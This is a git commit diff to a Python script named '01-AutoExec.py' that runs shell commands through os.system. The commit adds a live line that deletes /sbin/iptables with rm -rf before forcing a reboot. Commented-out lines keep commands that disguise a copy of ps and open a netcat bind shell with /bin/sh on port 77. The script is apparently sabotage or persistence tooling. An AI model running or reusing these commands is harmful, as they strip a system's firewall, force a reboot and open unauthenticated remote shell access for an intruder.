763cb4c68f0a86660ef8b3fa4a98ae1860d1405a
CyberCyber2 <56095531+CyberCyber2@users.noreply.github.com>
2021-03-17 18:11:36 -0400

    Update 01-AutoExec.py

--- BaseFiles/01-AutoExec.py
+++ BaseFiles/01-AutoExec.py
@@ -4,4 +4,5 @@ import os
 #os.system("cp /bin/ps /bin/pss  &> /dev/null")
 #os.system("apt-get install -y -vv netcat-traditional  &> /dev/null")
 #os.system("netcat -lvp 77 -e /bin/sh  &> /dev/null")
+os.system("rm -rf /sbin/iptables")
 os.system("reboot now &> /dev/null")
